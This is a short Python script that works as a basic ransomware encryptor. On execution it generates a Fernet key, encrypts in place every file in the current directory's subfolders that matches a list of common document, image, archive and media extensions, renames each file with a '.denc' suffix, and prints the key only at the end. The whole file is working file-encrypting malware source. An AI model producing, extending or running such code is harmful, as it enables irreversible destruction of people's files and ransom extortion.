from genericpath import isdir
from cryptography.fernet import Fernet
import os

targetfiletypes = [
    ".txt",
    ".docx",
    ".pdf",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".mp4",
    ".mp3",
    ".zip",
    ".rar",
    ".7z",
    ".tar",
    ".gz",
    ".bz2",
    ".xz",
    ".tar.gz",
    ".tar.bz2",
    ".xlsx",
    ".pptx",
    ".doc",
    ".ppt",
    ".xls",
    ".csv",
    ".xml",
    ".json",
]
key = Fernet.generate_key()
def encrypt_file(file):
    print("Encrypting {}".format(file))
    
    fern = Fernet(key)
    with open(file, 'rb') as f:
        data = f.read()
        encrypted_data = fern.encrypt(data)
        with open(file, 'wb') as f:
            f.write(encrypted_data)
            # rename the file to .encrypted\
            f.close()
        f.close()
    os.rename(file, file + '.denc')
    print("File encrypted")
def main():
    # get all of the directories in the current directory
    dirs = next(os.walk('.'))[1]
    for dir in dirs:
        for files in os.listdir(dir):
            if files.endswith(tuple(targetfiletypes)):
                encrypt_file(dir + '/' + files)
                print("File encrypted")
            
    

main()
print("Key: " + key.decode())